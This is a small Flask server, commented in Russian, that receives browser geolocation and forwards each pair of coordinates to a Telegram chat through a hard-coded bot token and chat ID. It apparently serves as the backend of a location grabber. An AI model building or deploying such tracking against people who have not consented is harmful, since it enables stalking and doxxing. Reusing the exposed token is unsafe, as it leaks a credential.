from flask import Flask, request, send_from_directory
import requests
from flask_cors import CORS

app = Flask(__name__, static_folder='static')
CORS(app)

BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'  # твой токен
CHAT_ID = 651911888  # твой Telegram ID

def send_to_telegram(lat, lon):
    text = f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    requests.post(url, data=data)

@app.route('/')
def serve_index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route("/send_location", methods=["POST"])
def send_location():
    data = request.json
    lat = data.get("latitude")
    lon = data.get("longitude")
    if lat and lon:
        send_to_telegram(lat, lon)
        return {"status": "ok"}
    return {"status": "error"}, 400

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
